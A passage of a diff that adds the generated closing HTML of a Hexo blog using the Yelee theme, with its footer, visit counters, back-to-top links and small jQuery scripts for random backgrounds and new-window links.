class="post-list-item"><a class="post-list-link" href="/2016/08/13/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2017 x-man
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
